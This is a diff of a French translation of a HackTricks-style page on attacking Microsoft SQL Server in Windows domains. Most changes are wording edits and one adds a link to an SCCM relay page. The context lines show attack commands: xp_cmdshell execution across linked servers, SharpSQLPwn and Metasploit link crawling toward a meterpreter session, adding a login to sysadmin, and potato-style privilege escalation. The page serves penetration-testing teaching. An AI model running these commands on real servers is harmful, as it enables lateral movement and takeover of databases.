@@ -135,7 +135,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ## MSSQL Abus de base
 
-### Accéder à la DB
+### Accéder à la base de données
 ```bash
 # List databases
 Get-SQLInstanceDomain | Get-SQLDatabase
@@ -212,7 +212,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-Un autre outil similaire qui pourrait être utilisé est [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn) :
+Un autre outil similaire qui pourrait être utilisé est [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
 # Cobalt Strike
@@ -226,7 +226,7 @@ Vous pouvez facilement vérifier les liens de confiance en utilisant metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Remarquez que metasploit essaiera d'abuser uniquement de la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus ci-dessous.)
+Remarquez que metasploit essaiera d'abuser uniquement de la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus bas.)
 
 ### Manuel - Openquery()
 
@@ -278,9 +278,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 L'**utilisateur local MSSQL** a généralement un type de privilège spécial appelé **`SeImpersonatePrivilege`**. Cela permet au compte de "se faire passer pour un client après authentification".
 
-Une stratégie que de nombreux auteurs ont développée est de forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
+Une stratégie que de nombreux auteurs ont développée consiste à forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) a une collection de ces diverses techniques qui peuvent être exécutées via la commande `execute-assembly` de Beacon.
 
+
+
+### Relais NTLM du point de gestion SCCM (Extraction de secrets OSD)
+Découvrez comment les rôles SQL par défaut des **Points de gestion SCCM** peuvent être abusés pour extraire les secrets du Compte d'accès réseau et de la séquence de tâches directement à partir de la base de données du site :
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
